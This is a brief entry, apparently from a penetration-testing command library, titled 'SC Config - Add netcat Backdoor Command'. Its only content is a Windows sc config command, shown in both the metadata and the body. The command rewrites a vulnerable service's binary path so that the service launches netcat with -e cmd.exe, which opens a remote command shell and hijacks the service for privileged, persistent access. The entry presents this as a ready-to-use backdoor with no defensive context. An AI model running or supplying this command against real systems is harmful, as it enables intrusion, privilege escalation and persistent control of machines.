---
id: 8ac9752d-54e3-4993-80c4-e0df9e9e76ca
name: SC Config - Add netcat Backdoor Command
type: command
executor: bash
data: $ sc config <vuln-service> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
output: null
created_at: '2023-04-06T03:56:29.545002+00:00'
updated_at: '2023-04-10T20:37:52.272360+00:00'
---

# SC Config - Add netcat Backdoor Command

```bash
$ sc config <vuln-service> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
```


